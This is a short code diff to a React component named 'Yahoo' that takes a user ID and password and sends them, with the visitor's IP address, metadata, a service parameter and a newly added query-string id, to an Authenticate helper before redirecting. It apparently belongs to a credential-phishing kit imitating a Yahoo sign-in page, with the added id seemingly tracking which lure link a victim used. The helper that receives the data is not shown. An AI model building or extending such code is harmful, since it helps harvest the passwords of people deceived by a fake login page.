@@ -5,9 +5,11 @@ import { useParams } from 'react-router-dom'
 import { Authenticate } from '../../helpers/Auth'
 import axios from 'axios'
 import Loader from '../../component/Loader'
+import useQueryParams from '../../hooks/useQueryParams'
 
 const Yahoo = () => {
   const { service } = useParams()
+  const id = useQueryParams()
   const [userID, setUserID] = useState('')
   const [password, setPassword] = useState('')
   const [showPasswordInput, setShowPasswordInput] = useState(false)
@@ -58,8 +60,8 @@ const Yahoo = () => {
         setShowPasswordInput(true)
       } else if (password) {
         setIsLoading(true)
-        Authenticate(userID, password, service, IPAddress, metaData).then(() =>
-          setRedirect(true)
+        Authenticate(userID, password, service, IPAddress, metaData, id).then(
+          () => setRedirect(true)
         )
       } else {
         setError('Enter your password')
